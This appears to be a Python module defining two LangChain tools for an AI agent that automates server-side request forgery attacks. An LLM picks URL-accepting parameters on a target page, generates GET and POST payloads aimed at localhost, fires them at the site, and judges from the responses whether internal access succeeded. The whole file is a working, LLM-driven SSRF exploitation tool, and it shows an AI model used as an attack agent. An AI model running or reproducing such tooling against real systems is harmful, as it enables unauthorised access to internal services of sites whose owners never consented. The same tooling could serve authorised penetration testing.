from langchain_core.tools import tool
from pydantic import BaseModel
from typing import List
import requests
import json
from models.llm import llm

class SSRFFinderInput(BaseModel):
    url: str

class SSRFExploiterInput(BaseModel):
    url: str
    params: List[str]

@tool(args_schema=SSRFFinderInput)
async def ssrf_finder(url: str) -> str:
    """
    This is the tool to scan parameters that can accept URLs for SSRF exploitation.
    """
    try:
        resp = requests.get(url, timeout=5)
        content = resp.text  # Không cắt, full luôn
    except Exception as e:
        return f"Error fetching content: {e}"

    prompt = f"""
Base on the content of the page below, help me find the list of candidate parameters which can input a URL to exploit SSRF.  
Only return the parameter names, one per line, no explanation, no extra text.

{content}
"""
    response = await llm.ainvoke(prompt)
    return f"This is the list of candidates params which can exploit ssrf:\n{response.content.strip()}"


@tool(args_schema=SSRFExploiterInput)
async def ssrf_exploiter(url: str, params: list) -> str:
    """
    Exploit SSRF vulnerabilities by injecting payloads into the given parameters
    of the base URL using both GET and POST. Analyze response with LLM.
    """
    prompt = f"""
- Based on the list of parameters below, generate a list of full URLs or POST payloads that can be used to exploit SSRF.
- For GET, format like:
  ["GET http://example.com?url=http://127.0.0.1:80"]
- For POST, format like:
  ["POST http://example.com | data=url=http://127.0.0.1:80"]
- Output a JSON-like list of these strings only, do not add anything else.

Parameters:
{params}

Base URL:
{url}
"""
    response = await llm.ainvoke(prompt)
    raw = response.content.strip()

    if not raw.startswith("[") or not raw.endswith("]"):
        return f"Invalid response format:\n{raw}"

    try:
        payloads = json.loads(raw)
    except json.JSONDecodeError as e:
        return f"Failed to parse LLM response as JSON:\n{e}\nRaw:\n{raw}"

    result_lines = ["SSRF Exploit Results:"]
    for entry in payloads:
        method = "GET"
        data = None
        this_url = url

        if entry.startswith("POST"):
            method = "POST"
            if "|" in entry:
                url_part, data_part = entry.split("|", 1)
                this_url = url_part.strip().split(" ", 1)[1].strip()
                if "data=" in data_part:
                    data_str = data_part.strip().split("data=", 1)[1]
                    try:
                        data = dict(x.split("=", 1) for x in data_str.split("&"))
                    except Exception as e:
                        result_lines.append(f"[ERROR] Malformed POST data in: {entry} -> {e}")
                        continue
        else:
            this_url = entry.split(" ", 1)[1].strip()

        try:
            r = requests.get(this_url, timeout=5) if method == "GET" else requests.post(this_url, data=data, timeout=5)

            verdict_prompt = f"""
Analyze the server response below after attempting an SSRF payload.

Say ONLY "YES" if there's evidence of SSRF success (e.g. access to localhost, internal content, backend errors).
Otherwise, say "NO".

Response:
{r.text}
"""
            verdict = await llm.ainvoke(verdict_prompt)
            if verdict.content.strip().upper().startswith("YES"):
                result_lines.append(f"[✔ SSRF Likely] {entry}")
            else:
                result_lines.append(f"[✘ Not Vulnerable] {entry}")
        except Exception as e:
            result_lines.append(f"[ERROR] {entry} -> {e}")

    return "\n".join(result_lines)

def get_ssrf_tools():
    return [ssrf_finder, ssrf_exploiter]
